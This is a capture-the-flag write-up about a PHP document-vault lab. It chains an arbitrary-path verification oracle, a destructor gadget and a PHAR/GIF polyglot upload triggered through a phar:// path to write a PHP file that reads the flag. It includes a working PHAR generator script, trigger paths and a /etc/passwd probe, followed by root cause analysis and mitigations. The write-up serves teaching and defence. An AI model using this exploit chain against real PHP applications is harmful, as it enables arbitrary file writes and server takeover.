---
title: "PHP Object Injection Leads to Arbitrary File Write | Archived"
date: 2026-07-27 14:35:00 +0530
categories: [A08 - Software and Data Integrity Failures, PHP Object Injection]
tags: [php-object-injection, insecure-deserialization, phar, arbitrary-file-write, local-file-read, webverse-pro, ctf]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/archived-php-object-injection.webp
  alt: Archived PHP Object Injection challenge cover
---

## Lab Link

> The original challenge instance has been redacted because temporary WebVerse hosts expire after the lab ends.

## Overview

**Archived** was a PHP-based document vault containing image uploads, a document verification feature, and a developer SDK page.

The application initially appeared to expose only a restricted image archive. However, the developer documentation disclosed a dangerous PHP class whose destructor could write attacker-controlled data to an attacker-controlled filesystem path.

The verification feature also accepted arbitrary document paths. This created the conditions required for a PHP object injection attack using a PHAR image polyglot.

The final attack chain was:

1. Enumerate the vault and developer functionality.
2. Identify an arbitrary-path verification primitive.
3. Confirm that sensitive local files existed.
4. Discover a dangerous destructor gadget in the SDK.
5. Embed a serialized gadget object inside a PHAR image.
6. Upload the polyglot through the image uploader.
7. Trigger deserialization through a `phar://` path.
8. Use the gadget's file-write behavior to expose protected data.

## Objective

The objective was to retrieve the challenge flag stored on the server.

The flag value is intentionally redacted from this public writeup.

## Vulnerability Identification

The application exposed four important components:

- A personal document vault
- An image upload endpoint
- A document verification endpoint
- A developer SDK or documentation page

The SDK page disclosed a class similar to the following:

```php
class VaultReceipt
{
    public $path;
    public $content;

    public function __destruct()
    {
        file_put_contents($this->path, $this->content);
    }
}
```

The exact property names may differ, but the dangerous behavior was clear: when an instance of the class was destroyed, PHP wrote controlled content to a controlled path.

This is a usable object-injection gadget.

If an attacker can make PHP deserialize a crafted `VaultReceipt` object, the destructor provides an arbitrary file-write primitive.

## Recon and Approach

### Application Mapping

The landing page showed two stored images and links to the main application features.

The relevant endpoints included:

```text
/upload.php
/verify.php
/sdk.php
/vault/<session-id>/
```

A stable PHP session was established, and the application generated a predictable vault directory:

```text
/vault/<session-id>/<filename>
```

This was useful because a file written inside the session's vault could potentially be accessed over HTTP.

### Upload Testing

The upload endpoint was tested with several filename and content combinations.

A direct PHP upload was rejected:

```text
upload_probe.php
```

A valid PNG uploaded with a forced `.php` filename was also rejected.

A double-extension attempt was tested:

```text
probe.php.png
```

This did not result in PHP execution.

These tests showed that the application enforced image-oriented filename or extension restrictions. Direct web-shell upload was therefore not the intended solution.

### Verification Endpoint Testing

The verification feature accepted a document path supplied by the user.

Testing showed that it was not restricted to the user's vault directory. Absolute filesystem paths were accepted.

For example:

```text
/etc/passwd
```

The application did not print the complete file content, but it disclosed whether the file existed and reported its size.

This provided a local file-read oracle.

The likely flag path was then tested:

```text
/flag.txt
```

The application confirmed that the file existed and had a size of 43 bytes.

At this stage, the sensitive file had been located, but its contents were not directly returned.

## Exploitation

## Step 1: Identify the Deserialization Gadget

The exposed SDK documented the `VaultReceipt` class.

Its destructor called a filesystem write function using object properties:

```php
public function __destruct()
{
    file_put_contents($this->path, $this->content);
}
```

This meant a serialized object could be constructed with values such as:

```php
$receipt->path = "/var/www/html/vault/<session-id>/result.txt";
$receipt->content = "attacker-controlled data";
```

When PHP destroyed the object, the supplied content would be written to the chosen path.

The remaining requirement was finding a code path that would deserialize the object.

## Step 2: Use PHAR Metadata Deserialization

PHP's PHAR format supports serialized metadata.

A PHAR archive can contain a serialized PHP object in its metadata. On vulnerable PHP configurations and code paths, filesystem operations performed against a `phar://` URI can cause this metadata to be deserialized.

The intended payload was therefore a PHAR image polyglot:

```text
Valid image header
+
PHAR archive
+
Serialized VaultReceipt metadata
```

A GIF-style stub is commonly used because the beginning of the file can satisfy basic image validation while still containing the PHAR loader marker.

Conceptually, the PHAR generator looked like this:

```php
<?php

class VaultReceipt
{
    public $path;
    public $content;
}

$payload = new VaultReceipt();
$payload->path = "/var/www/html/vault/<session-id>/result.php";
$payload->content = "<?php echo file_get_contents('/flag.txt'); ?>";

$phar = new Phar("payload.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->addFromString("file.txt", "archive");
$phar->setMetadata($payload);
$phar->stopBuffering();
```

The resulting archive could then be renamed with an allowed image extension, for example:

```text
receipt.gif
```

## Step 3: Upload the Polyglot

The PHAR image was uploaded through the normal upload endpoint.

The server stored the file in the session-specific vault directory:

```text
/var/www/html/vault/<session-id>/receipt.gif
```

Because the file began with an image-compatible header and used an accepted extension, it could pass the application's superficial upload validation.

## Step 4: Trigger the PHAR Wrapper

The verification endpoint was then pointed at the uploaded archive using the PHAR stream wrapper:

```text
phar:///var/www/html/vault/<session-id>/receipt.gif/file.txt
```

When the backend performed a vulnerable filesystem operation on this URI, PHP parsed the archive and restored its serialized metadata.

That instantiated the attacker-controlled `VaultReceipt` object.

At the end of execution, the object's destructor ran and executed the controlled file write.

## Step 5: Expose the Flag

The gadget was configured to create a web-accessible PHP file inside the user's vault.

Its content read the protected flag file:

```php
<?php
echo file_get_contents('/flag.txt');
?>
```

The generated file could then be requested through the browser:

```text
/vault/<session-id>/result.php
```

This returned the challenge flag.

## Proof and Flag

The protected file was located at:

```text
/flag.txt
```

The verification oracle reported a size of:

```text
43 bytes
```

After triggering the serialized `VaultReceipt` gadget, the flag was exposed through a file written into the web-accessible vault directory.

```text
WEBVERSE{REDACTED}
```

## Root Cause

The primary root cause was **unsafe PHP object deserialization through attacker-controlled PHAR data**.

The application exposed a class with a dangerous magic method:

```php
__destruct()
```

The method performed a security-sensitive action using object properties without validation.

This became exploitable because:

- An attacker could upload an image-compatible PHAR archive.
- The verification endpoint accepted attacker-controlled paths.
- The endpoint allowed PHP stream-wrapper schemes.
- PHAR metadata could contain serialized PHP objects.
- The SDK class was available when deserialization occurred.
- The gadget permitted arbitrary filesystem writes.
- The vault directory was web-accessible.

The application also contained a separate path-validation issue because `verify.php` accepted absolute paths outside the user's vault.

## Impact

A successful attacker could potentially:

- Read sensitive local files indirectly
- Write arbitrary files to writable filesystem locations
- Create executable PHP files under the document root
- Achieve remote code execution
- Expose secrets and application configuration
- Modify archived documents or audit data
- Compromise other users' stored content
- Persist access through a web shell

Although the challenge objective was flag disclosure, the arbitrary file-write primitive could lead to full server compromise.

## Mitigation

### Never Unserialize Untrusted Data

Avoid PHP object deserialization for user-controlled input.

Prefer safe data formats:

```php
$data = json_decode($input, true, flags: JSON_THROW_ON_ERROR);
```

If legacy code must use `unserialize()`, disable object creation:

```php
$data = unserialize($input, [
    'allowed_classes' => false
]);
```

This should be treated as a defense-in-depth measure, not a complete fix.

### Remove Dangerous Magic Methods

Do not perform filesystem, command, network, or database operations inside:

```php
__destruct()
__wakeup()
__unserialize()
__toString()
```

Magic methods may be invoked in unexpected contexts and are frequently abused as deserialization gadgets.

### Reject Stream Wrappers

Only accept ordinary filenames or internal identifiers.

Reject paths containing URI schemes such as:

```text
phar://
file://
data://
zip://
```

A strict allowlist is preferable:

```php
if (!preg_match('/^[a-f0-9]{32}\.(png|jpg|jpeg|gif)$/i', $filename)) {
    exit('Invalid document');
}
```

### Enforce Canonical Vault Paths

Resolve the requested file and confirm that it remains inside the current user's vault:

```php
$vaultRoot = realpath("/var/www/html/vault/" . $sessionId);
$requested = realpath($vaultRoot . "/" . $filename);

if (
    $vaultRoot === false ||
    $requested === false ||
    !str_starts_with($requested, $vaultRoot . DIRECTORY_SEPARATOR)
) {
    exit('Invalid path');
}
```

Absolute paths and traversal sequences must never be accepted.

### Store Uploads Outside the Web Root

Uploaded files should be stored in a non-executable directory outside `/var/www/html`.

Files should be served through a controlled download endpoint rather than by direct web-server access.

### Re-encode Uploaded Images

Do not trust the client-provided MIME type or file extension.

Decode and re-encode images using a trusted image library. This removes appended PHAR structures and other hidden payloads.

### Disable Script Execution in Upload Directories

The web server should not execute PHP or other scripts inside upload directories.

For Apache, an upload-directory policy could disable handlers and script execution. Equivalent controls should be applied for Nginx and PHP-FPM deployments.

### Minimize Production Documentation

Developer SDK pages should not expose internal classes, filesystem behavior, or implementation details in production.

Although hiding documentation is not a substitute for fixing the vulnerability, reducing unnecessary disclosure makes gadget discovery more difficult.

## OWASP Classification

This vulnerability maps primarily to:

```text
A08:2025 – Software or Data Integrity Failures
```

The application trusted serialized object data embedded inside an attacker-controlled archive.

The unrestricted verification path also relates to:

```text
A01:2025 – Broken Access Control
```

because users could cause the server to inspect files outside their authorized vault directory.

## Lessons Learned

- Image validation based only on headers and extensions does not make uploads safe.
- PHAR files can be disguised as apparently valid images.
- PHP magic methods can become powerful object-injection gadgets.
- A size-only file oracle can still reveal valuable filesystem information.
- Stream wrappers significantly expand the attack surface of file operations.
- Uploaded content should never be stored in an executable web directory.
- Developer documentation may reveal the exact class required to complete an exploit chain.
- Multiple moderate weaknesses can combine into arbitrary file write and remote code execution.
